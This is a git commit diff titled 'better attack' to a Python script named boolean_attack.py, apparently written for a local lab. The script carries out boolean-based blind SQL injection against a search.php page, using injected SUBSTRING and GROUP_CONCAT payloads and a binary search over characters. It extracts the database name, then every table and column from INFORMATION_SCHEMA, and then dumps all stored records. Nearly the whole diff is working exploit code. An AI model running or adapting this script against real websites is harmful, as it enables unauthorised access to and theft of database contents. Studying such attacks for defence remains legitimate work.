a29e683288b9e111114c0299abb57c1d7b255659
julkot1 <julian.kotlowski@gmail.com>
2025-12-15 20:20:09 +0100

    better attack

--- boolean_attack.py
+++ boolean_attack.py
@@ -2,16 +2,48 @@ import requests
 import urllib.parse
 import sys
 
+db_name = ""
+current_table = ""
+current_attr = ""
+
+def get_url_lt(idx, ch, url_idx):
+    if url_idx == 0:
+        return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
+    elif url_idx == 1:
+        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) < '{ch}"
+    elif url_idx == 2:
+        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) < '{ch}"
+    elif url_idx == 3:
+        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) < '{ch}"
+
+
+def get_url_eq(idx, ch, url_idx):
+    if url_idx == 0:
+        return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"
+    elif url_idx == 1:
+        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) = '{ch}"
+    elif url_idx == 2:
+        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) = '{ch}"
+    elif url_idx == 3:
+        return f"alice' and SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) = '{ch}"
+
 # url = "http://192.168.1.3/demo/search.php"
+def get_search_lt(idx, ch, url_idx):
+    return get_url_lt(idx, ch, url_idx)
 
-def get_search_lt(idx, ch):
-    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
+def get_search_eq(idx, ch, url_idx):
+    return get_url_eq(idx, ch, url_idx)
 
-def get_search_eq(idx, ch):
-    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"
 
-search_eq = "alice' AND (SELECT DATABASE()) = '"
-
+def search_eq(url_idx):
+    if url_idx == 0:
+        return "alice' AND (SELECT DATABASE()) = '"
+    elif url_idx == 1:
+        return f"alice' and (SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}') = '"
+    elif url_idx == 2:
+        return f"alice' and (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}') = '"
+    elif url_idx == 3:
+        return f"alice' and (SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}) = '"
 
 # def url_success(addr: str):
 #     return f"http://{addr}/demo/user.php"
@@ -31,44 +63,43 @@ def is_success(attack_url: str):
     return response.url != attack_url
 
 
-def lower(idx, ch, url: str) -> bool:
-    return is_success(encode_url(url, get_search_lt(idx, ch)))
+def lower(idx, ch, url: str, url_idx) -> bool:
+    return is_success(encode_url(url, get_search_lt(idx, ch, url_idx)))
 
-def eq_char(idx, ch, url: str) -> bool:
-    return is_success(encode_url(url, get_search_eq(idx, ch)))
+def eq_char(idx, ch, url: str, url_idx) -> bool:
+    return is_success(encode_url(url, get_search_eq(idx, ch, url_idx)))
 
-def eq(name, url: str) -> bool:
-    return is_success(encode_url(url, search_eq+name))
+def eq(name, url: str, url_idx) -> bool:
+    return is_success(encode_url(url, search_eq(url_idx)+name))
 
 
-def binary_search_char(idx, alphabet, url: str):
+def binary_search_char(idx, alphabet, url: str, url_idx):
     lo, hi = 0, len(alphabet) - 1
 
     while lo <= hi:
         mid = (lo + hi) // 2
         guess = alphabet[mid]
-
-        if eq_char(idx, guess, url):
+        if eq_char(idx, guess, url,url_idx):
             return guess
-        elif lower(idx, guess, url):
+        elif lower(idx, guess, url, url_idx):
             hi = mid - 1
         else:
             lo = mid + 1
     return None
 
 
-def guess_secret(url: str):
+def guess_secret(url: str, url_idx):
     alphabet = "".join(chr(i) for i in range(128))
     name = ""
     idx = 1
 
     while True:
-        if eq(name, url):
+        if eq(name, url, url_idx):
             return name
-        ch = binary_search_char(idx, alphabet, url)
+        ch = binary_search_char(idx, alphabet, url, url_idx)
         if ch is None:
-            raise ValueError("Character not found in ASCII!")
-
+           ch = ' '
+        
         name += ch
         idx += 1
 
@@ -79,7 +110,23 @@ def main():
         address = sys.argv[1]
     url  = f"http://{address}/demo/search.php"
     print(f"Attacking url: {url}")
-    print("Guessed:", guess_secret(url))
+    global db_name
+    db_name = guess_secret(url, 0).lower()
+    print("DB_name:", db_name)
+    tables = guess_secret(url,1).lower().split(" ")
+    print("tables: ", tables)
+    for table in tables:
+        global current_table
+        current_table = table
+        attrs = guess_secret(url,2).lower().split(" ")
+        print(f"table: {table}: {attrs}")
+        for attr in attrs:
+            global current_attr
+            current_attr = attr
+            records = guess_secret(url,3).lower().split(" ")
+            print(f"attr: {attr}: {records}")
+
+
     pass
 
 main()
